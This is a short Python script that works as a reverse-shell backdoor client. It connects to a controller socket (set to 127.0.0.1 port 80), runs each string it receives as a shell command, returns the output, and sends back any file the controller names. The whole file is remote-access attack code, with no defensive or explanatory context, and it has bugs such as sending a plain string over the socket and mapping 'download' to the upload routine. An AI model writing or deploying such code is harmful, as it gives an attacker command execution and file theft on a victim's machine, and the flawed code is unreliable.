import socket
import subprocess
import os

def connect():
    global s
    global host 
    global port
    # create the socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "127.0.0.1"
    port = 80
    connected = False
    while not connected:
        try:
            s.connect((host, port))
            connected = True
        except Exception as e:
            pass

def listen():
    while True:
        data = s.recv(1024).decode()
        if str(data) == 'download':
            upload()
            continue
        if str(data) == 'upload':
            upload()
            continue
        cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        cmd_bytes = cmd.stdout.read() + cmd.stderr.read()
        cmd_str = str(cmd_bytes)
        s.send(cmd_str.encode())
        if str(data) == 'q':
            break

# upload
def upload():
    filename = s.recv(1024)
    f = open(filename, 'rb')
    i = f.read(1024)
    while (i):
        s.send(i)
        i = f.read(1024)
    f.close()
    s.send('complete')

def close():
    s.close()

def main():
    connect()
    listen()
    close()

main()